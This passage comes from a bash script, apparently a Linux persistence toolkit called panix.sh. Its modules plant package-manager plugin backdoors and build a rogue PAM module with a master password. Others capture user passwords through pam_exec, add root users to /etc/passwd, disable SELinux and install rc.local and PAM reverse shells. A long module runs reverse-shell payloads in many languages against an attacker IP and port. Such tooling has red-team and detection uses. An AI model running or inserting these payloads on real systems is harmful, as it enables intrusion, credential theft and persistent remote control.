				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			if [[ -x "$(command -v dnf)" && "$(readlink -f "$(which yum)")" == "$(which dnf)" ]]; then
				echo "Yum is symlinked to DNF. Please use --dnf option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			echo "$python_script" > /usr/lib/yumcon
			chmod +x /usr/lib/yumcon

			echo -e "[main]\nenabled=1" > /etc/yum/pluginconf.d/yumcon.conf
			
			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import os\n\ntry:\n\tfrom yum.plugins import TYPE_INTERACTIVE, PluginYumExit\n\trequires_api_version = '2.0'\n\tplugin_type = TYPE_INTERACTIVE\nexcept ImportError:\n\trequires_api_version = '1.0'\n\ndef pretrans_hook(conduit):\n\tos.system('setsid /usr/lib/yumcon 2>/dev/null & ')" > /usr/lib/yum-plugins/yumcon.py

			echo "[+] Yum persistence established"
			;;

		--dnf )
			if [[ ! -x "$(command -v dnf)" ]]; then
				echo "DNF is not installed. Please install DNF to use this option."
				echo "Try './panix.sh --package-manager --help' for more information."
				exit 1
			fi

			python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
			python_path=$(which python)

			echo "$python_script" > /usr/lib/$python_version/site-packages/dnfcon
			chmod +x /usr/lib/$python_version/site-packages/dnfcon

			# If anyone finds a way for EOF to work with indentation in both an editor and on the host, LMK lol.
			echo -e "import dnf\nimport os\n\ndef execute_dnfcon():\n\tos.system('setsid /usr/lib/$python_version/site-packages/dnfcon 2>/dev/null &')\n\nclass BackdoorPlugin(dnf.Plugin):\n\tname = 'dnfcon'\n\n\tdef __init__(self, base, cli):\n\t\tsuper(BackdoorPlugin, self).__init__(base, cli)\n\t\texecute_dnfcon()\n\n\tdef __init__(self, base, conf, **kwargs):\n\t\tdnf.Plugin.__init__(self, base, conf, **kwargs)\n\t\texecute_dnfcon()\n\nplugin = BackdoorPlugin" > /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			chmod +x /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
			
			echo -e "[main]\nenabled=1" > /etc/dnf/plugins/dnfcon.conf

			echo "[+] DNF persistence established"
			;;
	esac
	echo "[+] Package manager persistence established!"
}

# Module: setup_pam.sh
setup_pam_persistence() {
	local pam_version=""
	local password=""
	local mechanism=""
	local log=""
	local backdoor=""
	local ip=""
	local port=""

	if [[ $EUID -ne 0 ]]; then
		echo "[-] This function can only be run as root."
		exit 1
	fi

	usage_pam_persistence() {
		echo "Usage: ./panix.sh --pam [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--module                     Inject rogue PAM module"
		echo "  --password <password>        Specify the backdoor password"
		echo "--pam-exec                   Inject via PAM_EXEC"
		echo "  --log                        Log user passwords"
		echo "  --backdoor                   Inject reverse shell backdoor"
		echo "    --ip <ip>                    Specify IP address"
		echo "    --port <port>                Specify port number"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--password )
				shift
				password="$1"
				;;
			--module | --pam-exec )
				mechanism="$1"
				;;
			--log )
				log=1
				;;
			--backdoor )
				backdoor=1
				;;
			--ip )
				shift
				ip="$1"
				;;
			--port )
				shift
				port="$1"
				;;
			--examples )
				echo "Example:"
				echo "sudo ./panix.sh --pam --module --password <password>"
				echo "sudo ./panix.sh --pam --pam-exec --log"
				echo "sudo ./panix.sh --pam --pam-exec --backdoor --ip 10.10.10.10 --port 1337"
				exit 0
				;;
			--help|-h)
				usage_pam_persistence
				exit 0
				;;
			* )
				echo "[-] Invalid option: $1"
				echo "Try './panix.sh --pam --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $mechanism ]]; then
		echo "[-] Missing required option: --module or --pam-exec."
		echo "Try './panix.sh --pam --help' for more information."
		exit 1
	fi

	if [[ "$mechanism" == "--module" && -z $password ]]; then
		echo "[-] --module requires --password."
		echo "Try './panix.sh --pam --help' for more information."
		exit 1
	fi

	if [[ "$mechanism" == "--pam-exec" ]]; then
		if [[ -z $log && -z $backdoor ]]; then
			echo "[-] --pam-exec requires either --log or --backdoor."
			echo "Try './panix.sh --pam --help' for more information."
			exit 1
		fi
		if [[ $backdoor -eq 1 && ( -z $ip || -z $port ) ]]; then
			echo "[-] --backdoor requires --ip and --port."
			echo "Try './panix.sh --pam --help' for more information."
			exit 1
		fi
	fi

	case $mechanism in
		# Inspired by: https://github.com/zephrax/linux-pam-backdoor
		--module )
			echo "[+] Determining PAM version..."
			if [ -f /etc/os-release ]; then
				. /etc/os-release
				linux_distro=${ID_LIKE:-$ID}
			else
				linux_distro=$(uname -s | tr '[:upper:]' '[:lower:]')
			fi

			case "$linux_distro" in
				*ubuntu*|*debian*|*mint*|*kali*)
					pam_version=$(dpkg -s libpam-modules 2>/dev/null | grep -i '^Version:' | awk '{ print $2 }')
					if [ -n "$pam_version" ]; then
						pam_version="${pam_version%%-*}"
					else
						echo "[-] PAM version not found on this system."
						exit 1
					fi
					;;
				*rhel*|*centos*|*fedora*)
					if command -v rpm &>/dev/null; then
						pam_version=$(rpm -q pam --queryformat '%{VERSION}-%{RELEASE}\n' 2>/dev/null)
						if [ -n "$pam_version" ]; then
							pam_version="${pam_version%%-*}"
						else
							echo "[-] PAM package not found."
							exit 1
						fi
					else
						echo "[-] RPM package manager not found."
						exit 1
					fi
					;;
				*)
					echo "[-] Unsupported distribution: $linux_distro"
					exit 1
					;;
			esac

			echo "[+] Detected PAM Version: '${pam_version}'"

			local dl_url="https://github.com/linux-pam/linux-pam/releases/download/v${pam_version}/Linux-PAM-${pam_version}.tar.xz"
			local src_dir="/tmp/Linux-PAM-${pam_version}"
			local tar_file="/tmp/linux_pam.tar"

			echo "[+] Downloading PAM source..."
			if command -v curl &>/dev/null; then
				curl -fsSL -o "$tar_file" "$dl_url"
			elif command -v wget &>/dev/null; then
				wget -q -O "$tar_file" "$dl_url"
			else
				echo "[-] Neither curl nor wget is available. Please install one of them and try again."
				exit 1
			fi

			if [ -f "$tar_file" ]; then
				echo "[+] Download completed. Extracting..."
				if tar -xvf "$tar_file" -C /tmp/ > /dev/null 2>&1; then
					rm -f "$tar_file"
					if [ -d "$src_dir" ]; then
						echo "[+] Extraction completed."
					else
						echo "[-] Extraction failed: Source directory not found."
						exit 1
					fi
				else
					echo "[-] Extraction failed."
					exit 1
				fi
			else
				echo "[-] Download failed: TAR file not found."
				exit 1
			fi

			echo "[+] Modifying PAM source..."
			local target_file="$src_dir/modules/pam_unix/pam_unix_auth.c"
			if grep -q "retval = _unix_verify_password(pamh, name, p, ctrl);" "$target_file"; then
				sed -i '/retval = _unix_verify_password(pamh, name, p, ctrl);/a\
				if (p != NULL && strcmp(p, "'$password'") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }' "$target_file"
				echo "[+] Source modified successfully."
			else
				echo "[-] Target string not found in $target_file. Modification failed."
				exit 1
			fi

			echo "[+] Compiling PAM source..."
			cd "$src_dir" || exit
			if [ ! -f "./configure" ]; then
				./autogen.sh
			fi
			./configure > /dev/null 2>&1
			make -j"$(nproc)" > /dev/null 2>&1

			if [ ! -f "modules/pam_unix/.libs/pam_unix.so" ]; then
				echo "[-] Compilation failed: PAM library not created."
				exit 1
			fi

			echo "[+] PAM compiled successfully."

			echo "[+] Detecting PAM library directory..."
			local dest_dir=""
			local possible_dirs=(
				"/lib/security"
				"/usr/lib64/security"
				"/lib/x86_64-linux-gnu/security"
				"/lib64/security"
			)

			for dir in "${possible_dirs[@]}"; do
				if [ -d "$dir" ] && [ -f "$dir/pam_unix.so" ]; then
					dest_dir="$dir"
					break
				fi
			done

			if [ -z "$dest_dir" ]; then
				echo "[-] Could not detect a valid PAM library directory."
				exit 1
			fi

			echo "[+] Copying PAM library to $dest_dir..."
			mv -f modules/pam_unix/.libs/pam_unix.so "$dest_dir"

			echo "[+] Checking SELinux status..."
			if command -v sestatus &>/dev/null && sestatus | grep -q "enabled"; then
				echo "[!] SELinux is enabled. Disabling SELinux..."
				setenforce 0
				echo "[!] SELinux disabled. Re-enable it after testing if necessary."
			fi

			echo "[+] Rogue PAM injected!"
			echo ""
			echo "You can now login to any user (including root) with a login shell using your specified password."
			echo "Example: su - user"
			echo "Example: ssh user@ip"
			;;

		--pam-exec )

			# Technique used from: https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
			if [[ $log -eq 1 ]]; then

				# Step 1: Create the script /var/log/spy.sh
				echo "[+] Creating /var/log/spy.sh..."

				echo -e "#!/bin/sh\necho \"    \$(date) \$PAM_USER, \$(cat -), From: \$PAM_RHOST\" >> /var/log/panix.log" > /var/log/spy.sh

				if [[ $? -eq 0 ]]; then
					chmod 700 /var/log/spy.sh
					if [[ $? -eq 0 ]]; then
						echo "[+] /var/log/spy.sh created and permissions set to 700."
					else
						echo "[-] Failed to set permissions on /var/log/spy.sh."
						exit 1
					fi
				else
					echo "[-] Failed to create /var/log/spy.sh."
					exit 1
				fi

				# Step 2: Create /var/log/panix.log
				echo "[+] Creating /var/log/panix.log..."

				touch /var/log/panix.log

				if [[ $? -eq 0 ]]; then
					chmod 770 /var/log/panix.log
					if [[ $? -eq 0 ]]; then
						echo "[+] /var/log/panix.log created and permissions set to 770."
					else
						echo "[-] Failed to set permissions on /var/log/panix.log."
						exit 1
					fi
				else
					echo "[-] Failed to create /var/log/panix.log."
					exit 1
				fi

				# Step 3: Append line to /etc/pam.d/common-auth
				echo "[+] Modifying /etc/pam.d/common-auth..."

				pam_line='auth optional pam_exec.so quiet expose_authtok /var/log/spy.sh'

				if grep -Fxq "$pam_line" /etc/pam.d/common-auth; then
					echo "[+] The line is already present in /etc/pam.d/common-auth."
				else
					echo "$pam_line" >> /etc/pam.d/common-auth
					if [[ $? -eq 0 ]]; then
						echo "[+] Line added to /etc/pam.d/common-auth."
					else
						echo "[-] Failed to modify /etc/pam.d/common-auth."
						exit 1
					fi
				fi

				echo "[+] PAM_EXEC logging backdoor planted!"
				echo "Watch /var/log/panix.log for user passwords."

			# Inspired by: https://www.group-ib.com/blog/pluggable-authentication-module/
			elif [[ $backdoor -eq 1 ]]; then

				# Step 1: Create the reverse shell script /bin/pam_exec_backdoor.sh
				echo "[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh..."
				echo -e "#!/bin/bash\nnohup setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1' &" > /bin/pam_exec_backdoor.sh

				if [[ $? -eq 0 ]]; then
					chmod 700 /bin/pam_exec_backdoor.sh
					if [[ $? -eq 0 ]]; then
						echo "[+] /bin/pam_exec_backdoor.sh created and permissions set to 700."
					else
						echo "[-] Failed to set permissions on /bin/pam_exec_backdoor.sh."
						exit 1
					fi
				else
					echo "[-] Failed to create /bin/pam_exec_backdoor.sh."
					exit 1
				fi

				# Step 2: Modify SSH PAM configuration
				pam_sshd_file="/etc/pam.d/sshd"
				pam_line="session    optional     pam_exec.so seteuid /bin/pam_exec_backdoor.sh"

				echo "[+] Modifying $pam_sshd_file to include the PAM_EXEC rule..."

				if grep -Fxq "$pam_line" "$pam_sshd_file"; then
					echo "[+] The PAM_EXEC rule is already present in $pam_sshd_file."
				else
					sed -i "1a ${pam_line}" "${pam_sshd_file}"
					if [[ $? -eq 0 ]]; then
						echo "[+] PAM_EXEC rule added to $pam_sshd_file."
					else
						echo "[-] Failed to modify $pam_sshd_file."
						exit 1
					fi
				fi

				# Step 3: Restart SSH service to apply changes
				echo "[+] Restarting SSH service to apply changes..."

				if systemctl restart sshd; then
					echo "[+] SSH service restarted successfully."
				else
					echo "[-] Failed to restart SSH service."
					exit 1
				fi

				echo "[+] PAM_EXEC reverse shell backdoor planted!"
				echo "Authenticate to trigger the reverse shell."
			fi
			;;
	esac

	echo "[+] PAM persistence established!"
}

# Module: setup_passwd_user.sh
setup_passwd_user() {
	local default=0
	local custom=0
	local username=""
	local password=""
	local passwd_string=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_passwd_user() {
		echo "Usage: ./panix.sh --passwd-user [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default settings"
		echo "  --username <username>        Specify the username"
		echo "  --password <password>        Specify the password"
		echo "--custom                     Use custom string"
		echo "  --passwd-string <string>     Specify the /etc/passwd string"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--passwd-string )
				shift
				passwd_string=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --passwd-user --default --username <username> --password <password>"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
				exit 0
				;;
			--help|-h)
				usage_passwd_user
				exit 0
				;;
		
			* )
				echo "Invalid option for --passwd-user: $1"
				echo "Try './panix.sh --passwd-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --passwd-user --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $username || -z $password ]]; then
			echo "Error: --username and --password must be specified with --default."
			echo "Try './panix.sh --passwd-user --help' for more information."
			exit 1
		fi

		if ! command -v openssl &> /dev/null; then
			echo "Error: openssl is not installed on this system. Use --custom with --passwd-string instead."
			exit 1
		fi

		openssl_password=$(openssl passwd "$password")
		if [[ $? -eq 0 ]]; then
			echo "$username:$openssl_password:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo "[+] User $username added to /etc/passwd with root privileges."
		else
			echo "[-] Failed to generate password hash with openssl."
			exit 1
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $passwd_string ]]; then
			echo "Error: --passwd-string must be specified with --custom."
			echo "Try './panix.sh --passwd-user --help' for more information."
			exit 1
		fi

		echo "$passwd_string" >> /etc/passwd
		echo "[+] Custom passwd string added to /etc/passwd."
	else
		echo "Error: Either --default or --custom must be specified for --passwd-user."
		echo "Try './panix.sh --passwd-user --help' for more information."
		exit 1
	fi
	echo "[+] /etc/passwd persistence established!"
}

# Module: setup_password_change.sh
setup_password_change() {
	local username=""
	local password=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_password_change() {
		echo "Usage: ./panix.sh --password-change [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--password <password>      Specify the new password"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --password-change --username <username> --password <password>"
				exit 0
				;;
			--help|-h)
				usage_password_change
				exit 0
				;;
			* )
				echo "Invalid option for --password-change: $1"
				echo "Try './panix.sh --password-change --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username || -z $password ]]; then
		echo "Error: --username and --password must be specified."
		echo "Try './panix.sh --password-change --help' for more information."
		exit 1
	fi

	echo "$username:$password" | chpasswd

	if [[ $? -eq 0 ]]; then
		echo "[+] Password for user $username has been changed."
	else
		echo "[-] Failed to change password for user $username."
		exit 1
	fi
}

# Module: setup_rc_local_backdoor.sh
setup_rc_local_backdoor() {
	local default=0
	local custom=0
	local ip=""
	local port=""
	local command=""
	local rc_local_path="/etc/rc.local"

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_rc_local_backdoor() {
		echo "Usage: ./panix.sh --rc-local [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default rc.local settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom rc.local settings"
		echo "  --command <command>          Specify custom command"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --rc-local --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --rc-local --custom --command \"/bin/bash -c 'sh -i >& /dev/tcp/10.10.10.10/1337 0>&1'\""
				exit 0
				;;
			--help|-h)
				usage_rc_local_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --rc-local-backdoor: $1"
				echo "Try './panix.sh --rc-local --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --rc-local --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --rc-local --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --rc-local --help' for more information."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/bash\n/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" > $rc_local_path
			chmod +x $rc_local_path
			echo "[+] rc.local backdoor established"
		else
			echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" >> $rc_local_path
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $command ]]; then
			echo "Error: --command must be specified when using --custom."
			echo "Try './panix.sh --rc-local --help' for more information."
			exit 1
		fi

		if [[ ! -f $rc_local_path ]]; then
			echo -e "#!/bin/sh\n$command" > $rc_local_path
			chmod +x $rc_local_path
		else
			echo "$command" >> $rc_local_path
		fi
	fi
	
	if [ -f /etc/rc.d/rc.local ]; then
		chmod +x /etc/rc.d/rc.local
	fi
	echo "[+] rc.local backdoor persistence established!"
}

# Module: setup_reverse_shell.sh
setup_reverse_shell() {
    local ip=""
    local port=""
    local mechanism=""

    usage_reverse_shell() {
        echo "Usage: ./panix.sh --reverse-shell [OPTIONS]"
        echo "--ip <ip>                       Specify the attacker's IP address"
        echo "--port <port>                   Specify the port to connect to"
        echo "--mechanism <mechanism>         Specify the reverse shell mechanism"
        echo "--examples                      Display command examples"
        echo ""
        echo "Available mechanisms:"
        echo "awk, bash, busybox, gawk, ksh, lua, nawk, nc, node, openssl, perl, php, pip, python, python3, ruby, sh-udp, socat, telnet"
        echo ""
    }

    while [[ "$1" != "" ]]; do
        case $1 in
            --ip )
                shift
                ip=$1
                ;;
            --port )
                shift
                port=$1
                ;;
            --mechanism )
                shift
                mechanism=$1
                ;;
            --examples )
                echo "Examples:"
                echo "sudo ./panix.sh --reverse-shell --ip 10.10.10.10 --port 1337 --mechanism sh-udp"
                exit 0
                ;;
            --help|-h)
                usage_reverse_shell
                exit 0
                ;;
            * )
                echo "Invalid option for --reverse-shell: $1"
                echo "Try './panix.sh --reverse-shell --help' for more information."
                exit 1
        esac
        shift
    done

    # Validate arguments
    if [[ -z $ip || -z $port || -z $mechanism ]]; then
        echo "Error: --ip, --port, and --mechanism are required."
        echo "Try './panix.sh --reverse-shell --help' for more information."
        exit 1
    fi

    case $mechanism in
    awk )
        # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
        echo "[!] Checking for Awk..."
        if command -v awk &>/dev/null; then
            echo "[+] Awk is available. Checking compatibility with |& operator..."
            # Test if `awk` supports the |& operator
            if awk 'BEGIN {exit !("|&" in _ENV)}' 2>/dev/null; then
                payload="awk -v RHOST=$ip -v RPORT=$port 'BEGIN {
                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
                    while (1) {
                        printf \"> \" |& s;
                        if ((s |& getline c) <= 0) break;
                        while (c && (c |& getline) > 0) print \$0 |& s;
                        close(c);
                    }
                }'"
                echo "[+] Awk is compatible. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] The installed Awk does not support the |& operator. Cannot use Awk for reverse shell."
            fi
        else
            echo "[-] Awk is not available on this system. Cannot use Awk for reverse shell."
        fi
        ;;
        bash )
            # Ref: https://gtfobins.github.io/gtfobins/bash/#reverse-shell
            echo "[!] Checking for Bash..."
            if command -v bash &>/dev/null; then
                payload="setsid nohup /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
                echo "[+] Bash is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] Bash is not available on this system. Cannot use Bash for reverse shell."
            fi
            ;;
        busybox )
            # Ref: https://gtfobins.github.io/gtfobins/busybox/#reverse-shell
            echo "[!] Checking for Busybox..."
            if command -v busybox &>/dev/null; then
                payload="busybox nc $ip $port -e /bin/sh"
                echo "[+] Busybox is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] Busybox is not available on this system. Cannot use Busybox for reverse shell."
            fi
            ;;
        gawk )
            # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
            echo "[!] Checking for Gawk..."
            if command -v gawk &>/dev/null; then
                payload="gawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
                    while (1) {
                        printf \"> \" |& s;
                        if ((s |& getline c) <= 0) break;
                        while (c && (c |& getline) > 0) print \$0 |& s;
                        close(c);
                    }
                }'"
                echo "[+] Gawk is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] Gawk is not available on this system. Cannot use Gawk for reverse shell."
            fi
            ;;
        ksh )
            # Ref: https://gtfobins.github.io/gtfobins/ksh/#reverse-shell
            echo "[!] Checking for Ksh..."
            if command -v ksh &>/dev/null; then
                payload="ksh -c 'ksh -i > /dev/tcp/$ip/$port 2>&1 0>&1'"
                echo "[+] KornShell (KSH) is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] KornShell (KSH) is not available on this system. Cannot use KSH for reverse shell."
            fi
            ;;
        lua )
            # Ref: https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell
            echo "[!] Checking for Lua..."
            if command -v lua &>/dev/null; then
                echo "[+] Lua is installed. Checking for LuaSocket..."
                
                if lua -e 'require("socket")' &>/dev/null; then
                    payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
                    echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
                    eval "$payload &"
                else
                    echo "[-] LuaSocket module is not installed. Cannot use Lua for reverse shell."
                fi
            else
                echo "[-] Lua is not available on this system. Cannot use Lua for reverse shell."
            fi
            ;;
        nawk )
            # Ref: https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell
            echo "[!] Checking for Nawk..."
            if command -v nawk &>/dev/null; then
                payload="nawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
                    while (1) {
                        printf \"> \" |& s;
                        if ((s |& getline c) <= 0) break;
                        while (c && (c |& getline) > 0) print \$0 |& s;
                        close(c);
                    }
                }'"
                echo "[+] Nawk is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] nawk is not available on this system. Cannot use Nawk for reverse shell."
            fi
            ;;
        nc )
            # Ref: https://gtfobins.github.io/gtfobins/nc/#reverse-shell
            echo "[!] Checking for Netcat (nc.traditional)..."
            if command -v nc.traditional &>/dev/null; then
                payload="nc.traditional -e /bin/sh $ip $port"
                echo "[+] nc.traditional is available. Executing reverse shell on $ip:$port..."
                eval "$payload &"
            else
                echo "[-] nc.traditional is not available on this system. Cannot use nc.traditional for reverse shell."
            fi
            ;;
        node )
            # Ref: https://gtfobins.github.io/gtfobins/node/#reverse-shell
            echo "[!] Checking for Node.js..."
            if command -v node &>/dev/null; then
                echo "[+] Node.js is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
                eval "$payload &"
            else
                echo "[-] Node.js is not available on this system. Cannot use Node.js for reverse shell."
            fi
            ;;
        openssl )
            # Ref: https://gtfobins.github.io/gtfobins/openssl/#reverse-shell
            echo "[!] Checking for OpenSSL..."
            if command -v openssl &>/dev/null; then
                echo "[+] OpenSSL is available. Executing reverse shell on $ip:$port..."

                echo ""
                echo "Make sure you have a correct listener up and running on the target host"
                echo "Use the following commands to set it up if you haven't already:"
                echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
                echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
                echo ""

                payload="RHOST=$ip; RPORT=$port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s; rm /tmp/s"
                eval "$payload &"
            else
                echo "[-] OpenSSL is not available on this system. Cannot use OpenSSL for reverse shell."
            fi
            ;;
        perl )
            # Ref: https://gtfobins.github.io/gtfobins/perl/#reverse-shell
            echo "[!] Checking for Perl..."
            if command -v perl &>/dev/null; then
                echo "[+] Perl is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; setsid nohup perl -e 'use Socket;\$i=\"\$ENV{RHOST}\";\$p=\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                eval "$payload &"
            else
                echo "[-] Perl is not available on this system. Cannot use Perl for reverse shell."
            fi
            ;;
        php )
            # Ref: https://gtfobins.github.io/gtfobins/php/#reverse-shell
            echo "[!] Checking for PHP..."
            if command -v php &>/dev/null; then
                echo "[+] PHP is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; setsid nohup php -r '\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                eval "$payload &"
            else
                echo "[-] PHP is not available on this system. Cannot use PHP for reverse shell."
                payload=""
            fi
            ;;
        python )
            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
            echo "[!] Checking for Python..."
            if command -v python &>/dev/null; then
                echo "[+] Python is available. Executing reverse shell on $ip:$port..."
                payload="nohup setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                eval "$payload &"
            else
                echo "[-] Python is not available on this system. Cannot use Python for reverse shell."
            fi
            ;;
        python3 )
            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
            echo "[!] Checking for Python3..."
            if command -v python3 &>/dev/null; then
                echo "[+] Python3 is available. Executing reverse shell on $ip:$port..."
                payload="nohup setsid python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
                eval "$payload &"
            else
                echo "[-] Python3 is not available on this system. Cannot use Python3 for reverse shell."
            fi
            ;;
        ruby )
            # Ref: https://gtfobins.github.io/gtfobins/ruby/#reverse-shell
            echo "[!] Checking for Ruby..."
            if command -v ruby &>/dev/null; then
                echo "[+] Ruby is available. Executing reverse shell on $ip:$port..."
                payload="export RHOST=$ip; export RPORT=$port; nohup setsid ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
                eval "$payload &"
            else
                echo "[-] Ruby is not available on this system. Cannot use Ruby for reverse shell."
            fi
            ;;
        sh-udp )
            # Ref: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
            echo "[!] Checking for Sh..."
            if command -v sh &>/dev/null; then
                echo "[+] Sh found. Executing reverse shell on $ip:$port..."
                payload="setsid nohup sh -i >& /dev/udp/$ip/$port 0>&1"
                eval "$payload &"
            else
                echo "[-] Sh is not available on this system. Cannot use Sh for reverse shell."
            fi
            ;;
        socat )
            # Ref: https://gtfobins.github.io/gtfobins/socat/#reverse-shell
            echo "[!] Checking for Socat..."
            if command -v socat &>/dev/null; then
                echo "[+] Socat is available. Executing reverse shell to $ip:$port..."

                echo ""
                echo "Make sure you have a correct listener up and running on the target host"
                echo "Use the following commands to set it up if you haven't already:"
                echo "socat FILE:`tty`,raw,echo=0 TCP:$ip:$port"
                echo ""

                payload="RHOST=$ip; RPORT=$port; socat tcp-connect:\$RHOST:\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
                eval "$payload &"
            else
                echo "[-] Socat is not available on this system. Cannot use Socat for reverse shell."
            fi
            ;;
        telnet )
            # Ref: https://gtfobins.github.io/gtfobins/telnet/#reverse-shell
            echo "[!] Checking for Telnet..."
            if command -v telnet &>/dev/null; then
                echo "[+] Telnet is available. Executing reverse shell to $ip:$port..."
